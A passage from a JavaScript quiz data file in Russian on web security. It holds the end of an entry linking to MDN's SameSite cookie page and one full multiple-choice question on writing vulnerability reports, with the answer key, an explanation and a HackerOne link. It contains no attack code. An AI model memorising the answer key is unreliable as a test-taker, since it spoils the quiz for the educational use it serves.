            url: "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite"
        }
    },
    {
        question: "Что самое важное при репортинге уязвимости?",
        answers: [
            "Чёткие шаги воспроизведения (PoC), описание Impact (что можно сделать), и рекомендации по исправлению",
            "Красивые скриншоты",
            "Сложные технические термины",
            "Большой объём текста",
            "Много ссылок на источники",
            "Список всех инструментов",
            "История поиска уязвимости"
        ],
        correctAnswerIndex: 0,
        explanation: "Репорт: 1. Шаги (URL, пейлоад), 2. Impact (можно украсть сессию admin), 3. Fix (использовать htmlspecialchars).",
        link: {
            label: "HackerOne: Writing Reports",
            url: "https://docs.hackerone.com/hackers/quality-reports.html"
        }
    }
];
